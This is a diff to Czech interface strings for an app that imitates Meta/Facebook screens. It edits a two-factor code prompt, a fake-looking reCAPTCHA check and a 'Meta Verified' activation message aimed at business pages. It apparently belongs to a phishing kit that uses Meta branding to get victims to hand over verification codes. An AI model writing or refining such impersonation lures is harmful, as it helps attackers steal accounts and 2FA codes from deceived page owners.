@@ -94,10 +94,10 @@ export const cs: AppStrings = {
   },
   twoFa: {
     title: 'Vyžadováno dvoufaktorové ověření',
-    description: (email, phone, businessGmail) =>
-      businessGmail
-        ? `Zadejte kód odeslaný na ${email}, ${businessGmail}, ${phone}, nebo potvrďte pomocí ověřovací aplikace (např. Duo Mobile nebo Google Authenticator).`
-        : `Zadejte kód odeslaný na ${email}, ${phone}, nebo potvrďte pomocí ověřovací aplikace (např. Duo Mobile nebo Google Authenticator).`,
+    description: (destinations: string) =>
+      destinations
+        ? `Zadejte kód odeslaný na ${destinations}, jiné propojené telefonní číslo nebo potvrďte pomocí nastavené autentizační aplikace (např. Duo Mobile nebo Google Authenticator).`
+        : `Zadejte kód odeslaný na váš účet, jiné propojené telefonní číslo nebo potvrďte pomocí nastavené autentizační aplikace (např. Duo Mobile nebo Google Authenticator).`,
     label: 'Ověřovací kód',
     placeholder: 'Zadejte ověřovací kód',
     hint: 'Platný kód má 6 nebo 8 číslic.',
@@ -122,13 +122,14 @@ export const cs: AppStrings = {
     cta: 'Zpět na Facebook',
   },
   captcha: {
+    title: "Bezpečnostní kontrola Meta Verified",
     altLogo: 'Logo Meta',
     altRecaptcha: 'reCAPTCHA',
     notRobot: 'Nejsem robot',
     verifying: 'Ověřování...',
     privacyTerms: 'Ochrana soukromí – Podmínky',
     p1:
-      'Pomáhá nám to bojovat proti škodlivému chování, odhalovat a předcházet spamu a udržovat integritu našich produktů.',
+      "Dokončete toto ověření, abyste mohli pokračovat v aktivaci Meta Verified pro vaši firmu a ochránili svou stránku před spamem a škodlivou aktivitou.",
     p2:
       'Pro tuto bezpečnostní kontrolu používáme produkt Google reCAPTCHA Enterprise. Použití reCAPTCHA Enterprise se řídí zásadami ochrany osobních údajů a podmínkami společnosti Google.',
     p3:
